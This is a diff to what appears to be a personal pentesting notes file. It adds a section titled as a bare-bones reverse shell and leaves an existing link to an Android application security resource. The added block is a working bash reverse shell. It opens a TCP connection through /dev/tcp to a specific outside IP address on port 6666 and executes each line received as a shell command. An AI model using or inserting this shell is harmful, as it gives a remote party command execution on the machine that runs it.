@@ -1,5 +1,11 @@
 # notes 
 
+### nthcolumn with the bare bones reverse shell
+````
+exec 5<>/dev/tcp/194.26.29.6/6666
+cat <&5 | while read line; do $line 2>&5 >&5; done
+````
+
 ### android pentesting @vasim_infosec
 
 https://manifestsecurity.com/android-application-security/
